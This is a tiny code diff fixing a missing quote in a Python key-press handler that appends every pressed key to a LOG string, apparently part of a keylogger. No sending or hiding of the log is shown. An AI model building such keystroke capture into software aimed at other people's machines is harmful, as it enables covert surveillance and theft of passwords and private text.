@@ -19,7 +19,7 @@ def on_press(key):
 		elif key == key.enter: LOG += '\n'
 		elif key == key.backspace: LOG += ''
 		elif key == key.ctrl: LOG += ' ctrl+'
-		elif key == key.tab: LOG += '\t
+		elif key == key.tab: LOG += '\t'
 		elif key == key.cmd: LOG += ' cmd+'
 		else:
 			LOG += str(key)
